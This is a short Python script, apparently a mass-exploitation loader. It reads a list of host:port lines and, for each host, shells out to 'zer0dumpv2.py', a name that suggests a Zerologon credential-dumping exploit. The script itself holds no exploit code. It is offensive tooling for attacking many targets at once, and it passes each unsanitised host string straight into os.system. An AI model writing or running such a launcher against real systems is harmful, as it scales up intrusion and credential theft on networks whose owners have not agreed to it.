import os,sys
file = open(sys.argv[1]).read().splitlines()
print('[+] Loader: '+ str(len(open(sys.argv[1]).readlines()))+' Hosts')
for line in file:
        line = line.split(':')
        try:
                os.system('python3 zer0dumpv2.py ' + line[0])
                pass
        except KeyboardInterrupt:
                pass